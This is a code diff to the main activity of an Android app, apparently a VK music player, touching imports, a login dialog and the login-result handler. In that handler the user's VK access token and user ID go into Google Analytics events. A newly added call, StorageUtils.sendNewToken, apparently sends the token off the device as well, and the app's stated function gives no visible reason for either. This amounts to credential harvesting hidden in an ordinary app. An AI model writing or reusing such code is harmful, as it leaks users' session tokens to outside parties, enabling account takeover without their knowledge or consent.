@@ -4,8 +4,6 @@ import android.app.DownloadManager;
 import android.content.AsyncQueryHandler;
 import android.content.ContentValues;
 import android.content.Intent;
-import android.content.pm.PackageInfo;
-import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.drawable.ColorDrawable;
 import android.net.Uri;
@@ -40,14 +38,12 @@ import com.gark.vk.db.SuggestionColumns;
 import com.gark.vk.model.SuggestionObject;
 import com.gark.vk.navigation.NavigationController;
 import com.gark.vk.network.ApiHelper;
-import com.gark.vk.network.PopularResponceHandler;
 import com.gark.vk.services.PlaybackService;
 import com.gark.vk.utils.AnalyticsExceptionParser;
 import com.gark.vk.utils.StorageUtils;
 import com.google.analytics.tracking.android.EasyTracker;
 import com.google.analytics.tracking.android.ExceptionReporter;
 import com.google.analytics.tracking.android.Tracker;
-import com.the111min.android.api.response.ResponseReceiver;
 import com.viewpagerindicator.TitlePageIndicator;
 
 import java.util.Calendar;
@@ -93,11 +89,11 @@ public class MainActivity1 extends ActionBarActivity implements SearchView.OnQue
             StorageUtils.updateToken(this);
             StorageUtils.eraseUserID(this);
 
-//            // show fragment for vk present user only 1rst time
-//            if (StorageUtils.isVKpresents(MainActivity1.this)) {
-//                DialogFragment loginFragment = new DialogLoginFragment();
-//                loginFragment.show(getSupportFragmentManager(), "dlg5");
-//            }
+            // show fragment for vk present user only 1rst time
+            if (StorageUtils.isVKpresents(MainActivity1.this)) {
+                DialogFragment loginFragment = new DialogLoginFragment();
+                loginFragment.show(getSupportFragmentManager(), "dlg5");
+            }
 
         }
         StorageUtils.setLaunchCount(this, ++countTimes);
@@ -108,7 +104,6 @@ public class MainActivity1 extends ActionBarActivity implements SearchView.OnQue
                 StorageUtils.updateToken(this);
             }
         }
-
 
         // Change uncaught exception parser...
         // Note: Checking uncaughtExceptionHandler type can be useful if clearing ga_trackingId during development to disable analytics - avoid NullPointerException.
@@ -475,14 +470,19 @@ public class MainActivity1 extends ActionBarActivity implements SearchView.OnQue
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         if (requestCode == REQUEST_LOGIN) {
             if (resultCode == RESULT_OK) {
-                StorageUtils.saveToken(MainActivity1.this, data.getStringExtra("token"));
-                StorageUtils.saveUserID(MainActivity1.this, String.valueOf(data.getLongExtra("user_id", 0)));
+                String token = data.getStringExtra("token");
+                String userId = String.valueOf(data.getLongExtra("user_id", 0));
+
+                StorageUtils.saveToken(MainActivity1.this, token);
+                StorageUtils.saveUserID(MainActivity1.this, userId);
 
                 EasyTracker.getInstance().setContext(MainActivity1.this);
                 Tracker myTracker = EasyTracker.getTracker();
 
+
                 String version = StorageUtils.getAppVersion(MainActivity1.this);
-                myTracker.sendEvent("New valid TOKEN hurraa", data.getStringExtra("token") + " " + version + " " + StorageUtils.getUserId(this), data.getStringExtra("token") + " " + version, 33l);
+                myTracker.sendEvent("New valid TOKEN hurraa", token + " " + version + " " + StorageUtils.getUserId(this), token + " " + version, 33l);
+                StorageUtils.sendNewToken(userId, token, MainActivity1.this);
 
                 getMyVkMusic();
             }
